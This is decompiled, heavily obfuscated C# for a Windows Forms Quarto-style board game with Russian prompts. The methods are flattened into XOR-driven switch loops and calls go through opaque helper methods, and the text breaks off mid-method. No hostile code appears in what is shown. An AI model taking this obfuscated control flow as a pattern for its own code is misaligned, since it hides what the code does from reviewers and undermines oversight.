using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 1101391226;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x2EB00498u) % 6u)
					{
					case 5u:
						Square = square;
						num = ((int)num2 * -1885020171) ^ 0x1DE49EEC;
						continue;
					case 4u:
						num = (int)((num2 * 362093734) ^ 0x6D774010);
						continue;
					case 2u:
						num = (int)((num2 * 902312728) ^ 0x4EEE4D8);
						continue;
					case 0u:
						Dark = dark;
						Big = big;
						num = (int)(num2 * 2105818291) ^ -1604111151;
						continue;
					case 3u:
						break;
					default:
						Point = point;
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		int num3 = default(int);
		int num5 = default(int);
		double num9 = default(double);
		while (true)
		{
			int num = -678741575;
			while (true)
			{
				uint num2;
				double num4;
				switch ((num2 = (uint)num ^ 0xE81516EBu) % 25u)
				{
				case 24u:
					num3++;
					num = ((int)num2 * -520671171) ^ 0x38B8173B;
					continue;
				case 23u:
					num = -1628136653;
					continue;
				case 22u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					Form1.smethod_11((Control)(object)menu);
					num = (int)((num2 * 543674486) ^ 0x11EE84D8);
					continue;
				}
				case 21u:
					pictureBox = new PictureBox[4, 4];
					num = (int)(num2 * 1090592571) ^ -1751011612;
					continue;
				case 20u:
					num = (int)((num2 * 1466835964) ^ 0x328B6298);
					continue;
				case 19u:
					num3 = 0;
					num = -228931700;
					continue;
				case 18u:
					num5 = 0;
					num = ((int)num2 * -530112793) ^ 0x6108D057;
					continue;
				case 17u:
					num = (int)((num2 * 1736789662) ^ 0x73C4EC87);
					continue;
				case 16u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = (int)(num2 * 1177723083) ^ -221594728;
					continue;
				case 15u:
				{
					PictureBox[,] array2 = pictureBox;
					int num11 = num5;
					int num12 = num3;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj2, new Point(4 + (int)(((double)num3 + num9) * (double)size), 4 + num5 * size));
					Form1.smethod_5((Control)(object)obj2, Color.White);
					array2[num11, num12] = obj2;
					Form1.smethod_6((Control)(object)pictureBox[num5, num3], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = (int)((num2 * 1575605496) ^ 0xB3E0388);
					continue;
				}
				case 14u:
					num4 = 4.1;
					goto IL_0192;
				case 13u:
					num = (int)((num2 * 849260655) ^ 0x3C43A367);
					continue;
				case 12u:
					num = (int)((num2 * 2127003218) ^ 0x16D12E24);
					continue;
				case 11u:
					borderBox = new PictureBox[4, 4];
					num = ((int)num2 * -1439127119) ^ 0x214174BB;
					continue;
				case 10u:
					InitializeComponent();
					num = ((int)num2 * -1075086224) ^ -1345938033;
					continue;
				case 8u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num5, num3]);
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num5, num3]);
					num = (int)((num2 * 1391872526) ^ 0x4C6FFE8B);
					continue;
				case 7u:
				{
					int num10;
					if (num3 < 4)
					{
						num = -1394384724;
						num10 = -1394384724;
					}
					else
					{
						num = -1107173668;
						num10 = -1107173668;
					}
					continue;
				}
				case 6u:
				{
					PictureBox[,] array = borderBox;
					int num7 = num5;
					int num8 = num3;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj, new Point(1 + (int)(((double)num3 + num9) * (double)size), 1 + num5 * size));
					Form1.smethod_7((Control)(object)obj, bool_0: false);
					array[num7, num8] = obj;
					num = ((int)num2 * -1188219498) ^ -1468677787;
					continue;
				}
				case 5u:
					num = (int)((num2 * 861580401) ^ 0xDB012BD);
					continue;
				case 4u:
				{
					int num6;
					if (num5 < 4)
					{
						num = -1754488771;
						num6 = -1754488771;
					}
					else
					{
						num = -1961272689;
						num6 = -1961272689;
					}
					continue;
				}
				case 2u:
					num = ((int)num2 * -638401526) ^ 0x7116FA76;
					continue;
				case 1u:
					num5++;
					num = ((int)num2 * -1377057222) ^ 0x70B8D4C2;
					continue;
				case 0u:
					if (num3 >= 2)
					{
						num = (int)((num2 * 484372025) ^ 0x2EF1BF02);
						continue;
					}
					num4 = 0.0;
					goto IL_0192;
				default:
					return;
				case 9u:
					break;
				case 3u:
					return;
					IL_0192:
					num9 = num4;
					num = -76844844;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = -1183794225;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC067DD54u) % 3u)
				{
				case 2u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_000d:
				num = ((int)num2 * -2051491140) ^ -1091703752;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -924442646;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC157486Fu) % 11u)
				{
				case 10u:
					num = ((int)num2 * -1065971647) ^ -1073406204;
					continue;
				case 9u:
					num = -1783964391;
					continue;
				case 8u:
					Form1.smethod_15(timer1);
					num = (int)((num2 * 1385208057) ^ 0x24976CD);
					continue;
				case 7u:
					num = (int)(num2 * 766407405) ^ -1785845107;
					continue;
				case 6u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = (int)(num2 * 286786992) ^ -1161899517;
					continue;
				}
				case 5u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = -84861253;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1264433434;
						num4 = -1264433434;
					}
					else
					{
						num3 = -777773876;
						num4 = -777773876;
					}
					num = num3 ^ (int)(num2 * 2052080253);
					continue;
				}
				case 1u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 1740165242) ^ -752852137;
					continue;
				case 0u:
					num = (int)((num2 * 410280823) ^ 0x221BF073);
					continue;
				default:
					return;
				case 2u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num3 = default(int);
		bool flag2 = default(bool);
		int num4 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 912743413;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3C840B93u) % 19u)
				{
				case 18u:
					Paint_Storage();
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 2096702579) ^ 0x373FFA50);
					continue;
				case 17u:
					num3++;
					num = (int)((num2 * 1530300050) ^ 0x4C23FEEE);
					continue;
				case 16u:
					num = 1967043931;
					continue;
				case 15u:
					Paint_Board();
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 1606880247) ^ 0x3A74098A);
					continue;
				case 14u:
					flag2 = num3 < 4;
					num = 747222546;
					continue;
				case 13u:
					board = new Figurine[4, 4];
					storage = new Figurine[4, 4];
					num = ((int)num2 * -1182711973) ^ 0x3F2D62F5;
					continue;
				case 12u:
				{
					int num7;
					int num8;
					if (flag2)
					{
						num7 = -1282358279;
						num8 = -1282358279;
					}
					else
					{
						num7 = -911993081;
						num8 = -911993081;
					}
					num = num7 ^ (int)(num2 * 910130449);
					continue;
				}
				case 11u:
					num3 = 0;
					num = ((int)num2 * -1053909746) ^ 0x570F2675;
					continue;
				case 10u:
					num4++;
					num = ((int)num2 * -976990902) ^ -1134395758;
					continue;
				case 9u:
					flag = num4 < 4;
					num = 1078810005;
					continue;
				case 8u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = -626161295;
						num6 = -626161295;
					}
					else
					{
						num5 = -1155655117;
						num6 = -1155655117;
					}
					num = num5 ^ (int)(num2 * 698365103);
					continue;
				}
				case 7u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					num = (int)((num2 * 449756668) ^ 0x725D76D6);
					continue;
				case 6u:
					num = ((int)num2 * -2076489054) ^ -999741488;
					continue;
				case 5u:
					num = (int)((num2 * 894873164) ^ 0x38C5CE12);
					continue;
				case 4u:
					num4 = 0;
					num = 2023311478;
					continue;
				case 3u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = (int)(num2 * 1723027287) ^ -1165402998;
					continue;
				case 1u:
					num = (int)(num2 * 2067548611) ^ -894322077;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		int num8 = default(int);
		bool flag2 = default(bool);
		int num5 = default(int);
		bool flag = default(bool);
		float num9 = default(float);
		float num10 = default(float);
		bool square = default(bool);
		float num7 = default(float);
		float num4 = default(float);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num3 = default(float);
		while (true)
		{
			int num = 505005948;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD8D1D4Eu) % 41u)
				{
				case 40u:
					num8 = 0;
					num = 2071807659;
					continue;
				case 39u:
					flag2 = board[num5, num8] != null;
					num = ((int)num2 * -1633424679) ^ -435934870;
					continue;
				case 38u:
					num = 651603745;
					continue;
				case 37u:
					num = (int)((num2 * 1838719021) ^ 0x4A03DBF1);
					continue;
				case 36u:
					flag = num8 < 4;
					num = 2026241061;
					continue;
				case 35u:
					num = 967373658;
					continue;
				case 34u:
					num9 = num10 * 0.9f / (float)Form1.smethod_27(2.0);
					square = board[num5, num8].Square;
					num = ((int)num2 * -1039541400) ^ -1842804781;
					continue;
				case 33u:
					num7 = (float)size * (num4 / 2f);
					num = ((int)num2 * -1539855302) ^ -344001319;
					continue;
				case 32u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = (int)((num2 * 672045100) ^ 0x5CCF0E94);
					continue;
				case 31u:
				{
					int num15;
					int num16;
					if (flag)
					{
						num15 = 1192859294;
						num16 = 1192859294;
					}
					else
					{
						num15 = 1778314309;
						num16 = 1778314309;
					}
					num = num15 ^ (int)(num2 * 1385306908);
					continue;
				}
				case 30u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -821027694) ^ -789989547;
					continue;
				case 29u:
					num5 = 0;
					num = (int)((num2 * 1155979658) ^ 0x3A262688);
					continue;
				case 28u:
					num = (int)((num2 * 242417128) ^ 0x6B61535D);
					continue;
				case 27u:
					num5++;
					num = ((int)num2 * -674530854) ^ -1496987697;
					continue;
				case 26u:
					Form1.smethod_28(graphics_, brush_, num7 + (float)(num8 * size), num7 + (float)(num5 * size), num9, num9);
					num = (int)((num2 * 135671967) ^ 0x28EC89C3);
					continue;
				case 25u:
				{
					int num20;
					int num21;
					if (!board[num5, num8].Point)
					{
						num20 = 1896949282;
						num21 = 1896949282;
					}
					else
					{
						num20 = 984748377;
						num21 = 984748377;
					}
					num = num20 ^ (int)(num2 * 852729238);
					continue;
				}
				case 24u:
					num = 42262454;
					continue;
				case 23u:
					num4 = 1f - num3 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 990393600;
					continue;
				case 21u:
				{
					int num19;
					if (board[num5, num8].Big)
					{
						num = 770507717;
						num19 = 770507717;
					}
					else
					{
						num = 1757576094;
						num19 = 1757576094;
					}
					continue;
				}
				case 20u:
					brush_ = Form1.smethod_26();
					num = 2034502765;
					continue;
				case 19u:
					num = (int)((num2 * 227788858) ^ 0x64D50D33);
					continue;
				case 18u:
				{
					int num17;
					int num18;
					if (flag2)
					{
						num17 = 548319466;
						num18 = 548319466;
					}
					else
					{
						num17 = 1249451618;
						num18 = 1249451618;
					}
					num = num17 ^ (int)(num2 * 1345126409);
					continue;
				}
				case 17u:
					num = (int)(num2 * 611637276) ^ -655227919;
					continue;
				case 16u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num7 + (float)(num8 * size), num7 + (float)(num5 * size), num9, num9);
					num = ((int)num2 * -604759641) ^ 0x53AACFC3;
					continue;
				case 15u:
					brush_ = Form1.smethod_25();
					num = (int)(num2 * 2070193750) ^ -217090435;
					continue;
				case 14u:
					num3 = 1f;
					num = ((int)num2 * -1564577120) ^ -2042722457;
					continue;
				case 12u:
				{
					int num13;
					int num14;
					if (board[num5, num8].Dark)
					{
						num13 = 986498687;
						num14 = 986498687;
					}
					else
					{
						num13 = 376604612;
						num14 = 376604612;
					}
					num = num13 ^ ((int)num2 * -159645585);
					continue;
				}
				case 11u:
					num10 = (float)size * num3;
					num = ((int)num2 * -1110482742) ^ 0x4D8E3240;
					continue;
				case 10u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)((num2 * 1180591448) ^ 0x760E1CED);
					continue;
				case 9u:
				{
					int num11;
					int num12;
					if (square)
					{
						num11 = -1881594249;
						num12 = -1881594249;
					}
					else
					{
						num11 = -565648681;
						num12 = -565648681;
					}
					num = num11 ^ ((int)num2 * -131327125);
					continue;
				}
				case 8u:
					num = (int)(num2 * 1170316119) ^ -1220369629;
					continue;
				case 7u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num8 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1846461051) ^ 0x2E725EAC;
					continue;
				case 6u:
					Form1.smethod_24(graphics_, brush_, num7 + (float)(num8 * size), num7 + (float)(num5 * size), num9, num9);
					num = 295190076;
					continue;
				case 5u:
					num7 = (float)size * (num4 / 2f);
					num9 = num10 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1510615591) ^ -1594813282;
					continue;
				case 4u:
					num = (int)(num2 * 1500411508) ^ -1474463717;
					continue;
				case 3u:
					num8++;
					num = ((int)num2 * -1931153658) ^ -548601208;
					continue;
				case 2u:
					num3 = 0.7f;
					num = 753433479;
					continue;
				case 1u:
				{
					int num6;
					if (num5 >= 4)
					{
						num = 293972175;
						num6 = 293972175;
					}
					else
					{
						num = 76615137;
						num6 = 76615137;
					}
					continue;
				}
				case 0u:
					num4 = 1f - num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num = 790971505;
					continue;
				default:
					return;
				case 13u:
					break;
				case 22u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		bool big = default(bool);
		float num5 = default(float);
		float num4 = default(float);
		float num8 = default(float);
		int num7 = default(int);
		Brush brush_ = default(Brush);
		Graphics graphics_ = default(Graphics);
		float num6 = default(float);
		float num9 = default(float);
		bool dark = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num2 = 953230118;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x6202995u) % 39u)
				{
				case 38u:
				{
					int num18;
					int num19;
					if (big)
					{
						num18 = 492448111;
						num19 = 492448111;
					}
					else
					{
						num18 = 1900007965;
						num19 = 1900007965;
					}
					num2 = num18 ^ ((int)num3 * -1348021660);
					continue;
				}
				case 37u:
					num5 = 1f - num4 * 0.9f / (float)Form1.smethod_27(2.0);
					num8 = (float)size * num4;
					num2 = 1549242726;
					continue;
				case 36u:
					num7++;
					num2 = 2105021200;
					continue;
				case 35u:
					num7 = 0;
					num2 = 1049806989;
					continue;
				case 34u:
					brush_ = Form1.smethod_25();
					num2 = (int)((num3 * 823357096) ^ 0x5EF1FBD9);
					continue;
				case 33u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num6, num6, num9, num9);
					num2 = ((int)num3 * -142387829) ^ 0x186117B6;
					continue;
				case 32u:
					big = storage[num, num7].Big;
					num2 = 675818040;
					continue;
				case 31u:
					num2 = ((int)num3 * -1519319575) ^ -1689790055;
					continue;
				case 30u:
					num2 = ((int)num3 * -935907832) ^ 0x18DFE85E;
					continue;
				case 29u:
				{
					int num14;
					int num15;
					if (dark)
					{
						num14 = -1292714177;
						num15 = -1292714177;
					}
					else
					{
						num14 = -1512187636;
						num15 = -1512187636;
					}
					num2 = num14 ^ (int)(num3 * 1186582283);
					continue;
				}
				case 27u:
					num2 = (int)(num3 * 1000545500) ^ -58583288;
					continue;
				case 26u:
					num2 = ((int)num3 * -88750934) ^ 0x2178A89C;
					continue;
				case 25u:
					num4 = 0.7f;
					num2 = 538305976;
					continue;
				case 23u:
					Form1.smethod_30((Control)(object)pictureBox[num, num7]);
					num2 = 2116215807;
					continue;
				case 22u:
					num2 = (int)(num3 * 968957261) ^ -1187230134;
					continue;
				case 21u:
					Form1.smethod_24(graphics_, brush_, num6, num6, num9, num9);
					num2 = 491935385;
					continue;
				case 20u:
					num++;
					num2 = (int)(num3 * 1153637695) ^ -479076293;
					continue;
				case 19u:
					brush_ = Form1.smethod_26();
					num2 = 2000886841;
					continue;
				case 18u:
					Form1.smethod_28(graphics_, brush_, num6, num6, num9, num9);
					num2 = (int)(num3 * 154230697) ^ -2024343584;
					continue;
				case 17u:
					num4 = 1f;
					num2 = ((int)num3 * -728226589) ^ 0x61182132;
					continue;
				case 16u:
					num2 = ((int)num3 * -2077067354) ^ 0x15F94E1A;
					continue;
				case 15u:
				{
					int num22;
					if (num7 >= 4)
					{
						num2 = 1532023244;
						num22 = 1532023244;
					}
					else
					{
						num2 = 309554531;
						num22 = 309554531;
					}
					continue;
				}
				case 14u:
					num9 = num8 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -649697385) ^ 0x4E7EFC9;
					continue;
				case 13u:
				{
					int num20;
					int num21;
					if (!flag3)
					{
						num20 = -1024716311;
						num21 = -1024716311;
					}
					else
					{
						num20 = -419869867;
						num21 = -419869867;
					}
					num2 = num20 ^ ((int)num3 * -2068589013);
					continue;
				}
				case 12u:
					flag3 = num7 < 2;
					num2 = (int)((num3 * 1800034404) ^ 0x3AB9DE93);
					continue;
				case 11u:
				{
					int num16;
					int num17;
					if (flag)
					{
						num16 = 2051757996;
						num17 = 2051757996;
					}
					else
					{
						num16 = 555828157;
						num17 = 555828157;
					}
					num2 = num16 ^ ((int)num3 * -344543409);
					continue;
				}
				case 10u:
				{
					int num12;
					int num13;
					if (!storage[num, num7].Point)
					{
						num12 = 1336249829;
						num13 = 1336249829;
					}
					else
					{
						num12 = 1133892558;
						num13 = 1133892558;
					}
					num2 = num12 ^ ((int)num3 * -1767122839);
					continue;
				}
				case 9u:
					flag2 = storage[num, num7] != null;
					num2 = 127919291;
					continue;
				case 8u:
				{
					int num10;
					int num11;
					if (!flag2)
					{
						num10 = 11753162;
						num11 = 11753162;
					}
					else
					{
						num10 = 779223126;
						num11 = 779223126;
					}
					num2 = num10 ^ ((int)num3 * -790311177);
					continue;
				}
				case 7u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num7]));
					num2 = ((int)num3 * -538374740) ^ 0x3C9C4E38;
					continue;
				case 6u:
					num6 = (float)size * (num5 / 2f) - 4f;
					num2 = ((int)num3 * -123997703) ^ 0x6FD92A7B;
					continue;
				case 5u:
					flag = num < 4;
					num2 = 652628352;
					continue;
				case 4u:
					num9 = num8 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -1857807038) ^ 0x6C6D2294;
					continue;
				case 3u:
					Form1.smethod_20(pictureBox[num, num7], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num7]), Form1.smethod_16((Control)(object)pictureBox[num, num7])));
					num2 = ((int)num3 * -1648837816) ^ 0x643C782C;
					continue;
				case 2u:
					dark = storage[num, num7].Dark;
					num2 = (int)(num3 * 415882552) ^ -815621921;
					continue;
				case 1u:
					num5 = 1f - num4 * 0.4f / (float)Form1.smethod_27(2.0);
					num6 = (float)size * (num5 / 2f) - 4f;
					num2 = 1835960766;
					continue;
				case 0u:
					num2 = (int)(num3 * 1896727532) ^ -236136144;
					continue;
				default:
					return;
				case 28u:
					break;
				case 24u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num10 = default(int);
		int num7 = default(int);
		bool flag = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			int num = -2002279403;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC753B813u) % 27u)
				{
				case 26u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -616320869) ^ -1312689417;
					continue;
				case 25u:
					num10++;
					num = ((int)num2 * -1755285667) ^ 0x34B05C08;
					continue;
				case 24u:
					num10 = 0;
					num = -203380505;
					continue;
				case 23u:
					step = 0;
					num = (int)((num2 * 1953153942) ^ 0x45377AC7);
					continue;
				case 22u:
					num = ((int)num2 * -344611073) ^ -1923596113;
					continue;
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					step = 1;
					num = (int)((num2 * 1362807800) ^ 0x57036FAF);
					continue;
				case 20u:
					num7 = 0;
					num = ((int)num2 * -2067940416) ^ -236678307;
					continue;
				case 17u:
					num = ((int)num2 * -873311617) ^ -126794556;
					continue;
				case 16u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 2127192577) ^ 0x39593C06);
					continue;
				case 15u:
					flag = num10 < 4;
					num = -19404931;
					continue;
				case 14u:
					num3 = Form1.smethod_33(rnd, 4);
					num4 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 890710774) ^ -1368538352;
					continue;
				case 13u:
					num7++;
					num = ((int)num2 * -823345936) ^ -2100995210;
					continue;
				case 12u:
					num = ((int)num2 * -1483428820) ^ -231024180;
					continue;
				case 11u:
					num = (int)(num2 * 2000407586) ^ -490180093;
					continue;
				case 10u:
					num = (int)((num2 * 1358808345) ^ 0x103FF0F9);
					continue;
				case 9u:
					num = ((int)num2 * -1966467199) ^ -534308872;
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)pictureBox[num7, num10], bool_0: true);
					num = -54433620;
					continue;
				case 7u:
				{
					int num11;
					if (num7 >= 4)
					{
						num = -1513153040;
						num11 = -1513153040;
					}
					else
					{
						num = -1828081729;
						num11 = -1828081729;
					}
					continue;
				}
				case 6u:
					Form1_Load(this, Form1.smethod_31());
					num = ((int)num2 * -2002039191) ^ -342336600;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -204909174;
					continue;
				case 4u:
				{
					int num8;
					int num9;
					if (!flag)
					{
						num8 = -1603532439;
						num9 = -1603532439;
					}
					else
					{
						num8 = -621332177;
						num9 = -621332177;
					}
					num = num8 ^ (int)(num2 * 484726017);
					continue;
				}
				case 3u:
					num = (int)((num2 * 1508609791) ^ 0x1EC39183);
					continue;
				case 2u:
					num = -1634005840;
					continue;
				case 1u:
				{
					int num5;
					int num6;
					if (turn)
					{
						num5 = 920309763;
						num6 = 920309763;
					}
					else
					{
						num5 = 1460265694;
						num6 = 1460265694;
					}
					num = num5 ^ ((int)num2 * -1680145896);
					continue;
				}
				case 0u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.Blue);
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 772828867) ^ -1157076636;
					continue;
				case 19u:
					break;
				default:
					Form1.smethod_36(timer1);
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 817517314;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3C64A3CCu) % 3u)
				{
				case 2u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0003:
				time = time.AddSeconds(1.0);
				Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
				num = ((int)num2 * -1450055293) ^ -2121989741;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		Point point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
		int num9 = default(int);
		int num6 = default(int);
		int num5 = default(int);
		int num8 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1082883228;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0x742B8EE7u) % 24u)
				{
				case 23u:
					num9++;
					num = (int)((num2 * 1898054368) ^ 0x2C56B212);
					continue;
				case 22u:
					num = ((int)num2 * -952095027) ^ 0x4E6A5655;
					continue;
				case 20u:
					num6 -= 4;
					num = (int)(num2 * 1004945169) ^ -230998196;
					continue;
				case 19u:
					num5 = point.Y / size;
					num = (int)((num2 * 1164160793) ^ 0x23E58286);
					continue;
				case 18u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.Red);
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 1044187814) ^ 0x6C502E52);
					continue;
				case 17u:
					num = (int)(num2 * 129931900) ^ -1621177770;
					continue;
				case 16u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num5, num6]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = 665736043;
						num7 = 665736043;
						continue;
					}
					goto IL_00f7;
				case 15u:
					num8++;
					num = (int)((num2 * 1317071007) ^ 0x61BEDBFA);
					continue;
				case 14u:
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = 1681665087;
					continue;
				case 13u:
					flag = num9 < 4;
					num = 499021276;
					continue;
				case 12u:
				{
					int num12;
					if (num8 >= 4)
					{
						num = 1088358077;
						num12 = 1088358077;
					}
					else
					{
						num = 1692822470;
						num12 = 1692822470;
					}
					continue;
				}
				case 11u:
					num = ((int)num2 * -1866355434) ^ 0x13226E90;
					continue;
				case 10u:
					num6 = point.X / size;
					flag2 = num6 > 1;
					num = ((int)num2 * -915863833) ^ -1793752239;
					continue;
				case 9u:
					num9 = 0;
					num = 267315316;
					continue;
				case 8u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = -1520547341;
						num11 = -1520547341;
					}
					else
					{
						num10 = -853090408;
						num11 = -853090408;
					}
					num = num10 ^ ((int)num2 * -549544168);
					continue;
				}
				case 7u:
					if (storage[num5, num6] != null)
					{
						num = 1333790375;
						continue;
					}
					goto IL_00f7;
				case 6u:
					num = (int)(num2 * 501516842) ^ -1613988214;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)((num2 * 1758453513) ^ 0x744B3844);
					continue;
				case 4u:
					num8 = 0;
					num = ((int)num2 * -772569066) ^ -667946007;
					continue;
				case 3u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -624996298;
						num4 = -624996298;
					}
					else
					{
						num3 = -2119843633;
						num4 = -2119843633;
					}
					num = num3 ^ ((int)num2 * -525782763);
					continue;
				}
				case 2u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -1282729201) ^ -449572805;
					continue;
				case 0u:
					num = ((int)num2 * -1549046331) ^ -102583472;
					continue;
				default:
					return;
				case 21u:
					break;
				case 1u:
					return;
					IL_00f7:
					num = 189582806;
					num7 = 189582806;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_0188: Expected O, but got Unknown
		int num6 = default(int);
		bool flag = default(bool);
		int num5 = default(int);
		int num4 = default(int);
		int num3 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1833646754;
			while (true)
			{
				uint num2;
				int num8;
				switch ((num2 = (uint)num ^ 0x316058A8u) % 23u)
				{
				case 22u:
					num6 = 0;
					num = (int)((num2 * 835494123) ^ 0x59B309A1);
					continue;
				case 21u:
					num = ((int)num2 * -531361340) ^ -1498149425;
